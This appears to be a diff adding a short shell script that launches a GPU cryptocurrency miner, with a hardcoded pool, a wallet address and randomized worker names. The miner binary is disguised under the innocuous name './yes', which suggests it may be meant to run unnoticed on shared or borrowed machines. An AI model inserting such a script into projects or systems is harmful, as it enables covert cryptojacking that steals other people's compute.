@@ -1,0 +1,6 @@
+POOL=rvn-sg.kryptex.network:7031
+WALLET=RSDpL1mu74SUkkhozDNDnyNY8K499aM2vX
+gpu_name=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
+WORKER=$(echo Vio-$(shuf -i 1-9987 -n 1))
+ALGO=wrkzcoin
+./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
